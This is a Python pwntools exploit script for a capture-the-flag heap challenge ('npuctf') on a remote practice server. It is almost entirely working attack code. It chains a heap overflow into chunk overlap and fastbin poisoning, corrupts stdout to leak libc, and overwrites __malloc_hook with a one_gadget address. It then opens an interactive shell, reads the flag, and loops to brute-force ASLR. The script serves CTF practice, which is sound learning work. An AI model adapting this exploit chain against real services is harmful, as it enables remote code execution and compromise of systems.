from pwn import *


def run():
    # p = process('./npuctf')
    p = remote('node4.buuoj.cn', 27211)
    elf = ELF('./npuctf')
    lib = ELF('../../pwn/libc/u16/libc-2.23-64.so')

    def choice(id_):
        p.recvuntil(b'>>')
        p.sendline(id_)

    def add(id_, size_, mess):
        choice(b'1')
        p.recvuntil(b':')
        p.sendline(id_)
        p.recvuntil(b':')
        p.sendline(str(int(size_)))
        p.recvuntil(b':')
        p.send(mess)

    def edit(id_, size_, mess):
        choice(b'2')
        p.recvuntil(b':')
        p.sendline(id_)
        p.recvuntil(b':')
        p.sendline(str(int(size_)))
        p.recvuntil(b':')
        p.send(mess)

    def delete(id_):
        choice(b'3')
        p.recvuntil(b':')
        p.sendline(id_)

    add(b'0', 0x10, b'aaa')
    add(b'1', 0x10, b'bbb')
    add(b'2', 0x60, b'ccc')
    add(b'3', 0x10, b'eee')
    delete(b'2')
    payload = p64(0) * 3 + p64(0x91)
    edit(b'0', 0x20, payload)
    delete(b'1')
    add(b'4', 0x10, b'aaa')
    payload = p64(0) * 3 + p64(0x71) + p16(0x55dd)
    edit(b'4', 0x28, payload)
    add(b'5', 0x60, b'aaa')
    payload = b'a' * 3 + p64(0) * 6 + p64(0xfbad1800) + p64(0) * 3 + b'\x58'    # change stdout
    add(b'5', 0x60, payload)

    # noinspection PyBroadException
    # try stdout
    try:
        base_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00')) - lib.sym['_IO_2_1_stdout_'] - 131
        print(hex(base_addr))
        fake_hook = base_addr + lib.sym['__malloc_hook'] - 0x18 + 5
        print(hex(fake_hook))
        key = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
        ogg = base_addr + key[3]
    except:
        p.close()
        return 0

    add(b'6', 0x60, b'mmm')
    add(b'7', 0x60, b'nnn')
    add(b'8', 0x60, b'mmm')
    delete(b'8')
    payload = p64(0) * 13 + p64(0x71) + p64(fake_hook)
    edit(b'7', len(payload), payload)
    add(b'6', 0x60, b'mmm')
    payload = b'm' * 3 + p64(ogg)
    add(b'7', 0x60, payload)
    choice(b'1')
    p.sendline(b'9')
    p.sendline(b'16')
    p.sendline(b'cat flag')
    p.interactive()


if __name__ == '__main__':
    while True:
        run()
